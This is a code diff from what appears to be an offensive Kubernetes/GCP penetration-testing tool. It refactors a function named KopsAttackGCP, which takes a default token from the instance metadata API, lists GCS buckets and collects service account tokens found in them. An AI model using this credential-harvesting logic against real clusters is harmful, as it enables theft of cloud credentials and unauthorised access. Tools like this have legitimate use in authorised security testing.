@@ -63,7 +63,7 @@ func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error)
 	}
 }
 
-func KopsAttackGCP() (serviceAccountsToReturn []ServiceAccount, err error) {
+func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
 	var storeTokens string
 	var placeTokensInStore bool
 
@@ -80,7 +80,7 @@ func KopsAttackGCP() (serviceAccountsToReturn []ServiceAccount, err error) {
 	if err != nil {
 		msg := "[-] Could not get GCP default token from metadata API"
 		println(msg)
-		return nil, errors.New(msg)
+		return errors.New(msg)
 	} else {
 		println("[+] Got default token for GCP - preparing to use it for GCS:", token)
 	}
@@ -94,7 +94,7 @@ func KopsAttackGCP() (serviceAccountsToReturn []ServiceAccount, err error) {
 	if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
 		msg := "[-] Could not get GCP project from metadata API"
 		println(msg)
-		return nil, errors.New(msg)
+		return errors.New(msg)
 	}
 	println("[+] Got numberic project ID", projectID)
 
@@ -110,7 +110,7 @@ func KopsAttackGCP() (serviceAccountsToReturn []ServiceAccount, err error) {
 	if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
 		msg := "[-] blank bucket list or error retriving bucket list"
 		println(msg)
-		return nil, errors.New(msg)
+		return errors.New(msg)
 	}
 	bucketListLines := strings.Split(string(bucketListRaw), "\n")
 
@@ -171,9 +171,7 @@ eachbucket:
 							if placeTokensInStore {
 								tokenName := "GCS-acquired: " + string(serviceAccountName)
 								println("[+] Storing token as:", tokenName)
-								serviceAccount := MakeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
-								serviceAccountsToReturn = append(serviceAccountsToReturn, serviceAccount)
-
+								AddNewServiceAccount(tokenName, tokenString, "GCS Bucket", serviceAccounts)
 							}
 						}
 
@@ -184,8 +182,6 @@ eachbucket:
 		}
 	}
 
-	//
-	// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
-	return serviceAccountsToReturn, nil
+	return nil
 
 }
